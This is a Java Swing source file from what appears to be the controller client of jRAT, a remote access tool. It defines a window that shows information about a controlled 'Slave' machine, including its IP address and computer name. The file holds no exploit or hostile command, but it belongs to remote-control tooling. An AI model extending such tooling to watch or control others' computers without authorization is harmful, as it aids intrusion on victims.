package su.jrat.client.ui.frames;

import java.awt.BorderLayout;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import su.jrat.client.Slave;
import su.jrat.client.ui.panels.PanelControlComputerInfo;

@SuppressWarnings("serial")
public class FrameComputerInfo extends JFrame {

	private JPanel contentPane;

	public FrameComputerInfo(Slave slave) {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);
		contentPane.add(new PanelControlComputerInfo(slave));
		setTitle("Computer Info - " + slave.getIP() + " - " + slave.getComputerName());
	}

}
